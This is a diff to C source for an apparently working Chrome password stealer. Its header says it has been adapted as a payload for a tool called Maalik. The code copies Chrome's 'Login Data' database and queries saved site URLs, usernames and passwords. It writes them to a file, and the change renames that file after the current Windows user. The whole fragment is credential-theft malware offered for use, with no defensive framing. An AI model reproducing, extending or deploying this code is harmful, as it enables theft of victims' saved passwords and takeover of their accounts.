@@ -18,11 +18,14 @@ This has been modified to work with Maalik as a Payload.
 #include "sqlite/sqlite3.h"
 #include <shlobj.h> /* CSIDL_LOCAL_APPDATA */
 
+#define UNLEN 256
 #define CHROME_APP_DATA_PATH  "\\Google\\Chrome\\User Data\\Default\\Login Data"
 #define TEMP_DB_PATH          ".\\chromedb_tmp"
 #define USER_DATA_QUERY       "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS"
-#define SECRET_FILE           ".\\passwords.txt"
 #define ROW_ID_COUNT		100
+
+
+char* SECRET_FILE;
 
 FILE *file_with_secrets;
 int row_id = 1;
@@ -57,7 +60,10 @@ void TheMainFunction(void) {
 		// fprintf(stderr, "sqlite3_open_v2() -> Cannot open database: %s\n", sqlite3_errstr(result));
 		goto out;
 	}
-
+	
+	SECRET_FILE = malloc(UNLEN + 1);
+	DWORD len = UNLEN + 1;
+	GetUserNameA(SECRET_FILE, &len);
 	file_with_secrets = fopen(SECRET_FILE, "w+");
 	if (!file_with_secrets) {
 		// fprintf(stderr, "fopen() -> File created failed\n");
